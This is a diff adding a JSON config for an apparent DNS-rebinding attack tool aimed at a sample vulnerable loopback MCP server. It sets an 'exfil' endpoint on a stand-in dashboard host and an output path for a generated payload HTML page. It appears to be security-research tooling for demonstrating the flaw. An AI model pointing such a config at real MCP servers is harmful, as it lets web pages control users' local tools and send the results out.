@@ -1,0 +1,31 @@
+{
+  "name": "sample-streamable-8081",
+  "targetName": "sample-vuln-mcp",
+  "transport": "streamable-control",
+  "port": 8081,
+  "path": "/mcp",
+  "strategy": "fs",
+  "pollMs": 800,
+  "maxTries": 40,
+  "exfil": "http://dashboard.example.com:8090/c",
+  "out": "payloads/sample-streamable-8081.html",
+  "impact": {
+    "summary": "Browser-originated control of a loopback MCP server that accepts rebound Host and Origin.",
+    "vulnerableCondition": "The MCP server binds to 127.0.0.1 and does not enforce Host or Origin allowlists.",
+    "evidenceGoal": "Show tools/list and tools/call responses read by the operator dashboard through the browser session."
+  },
+  "tasks": [
+    {
+      "name": "Enumerate tools",
+      "kind": "tools/list"
+    },
+    {
+      "name": "Call echo",
+      "kind": "tools/call",
+      "tool": "echo",
+      "args": {
+        "message": "rebind-ok"
+      }
+    }
+  ]
+}
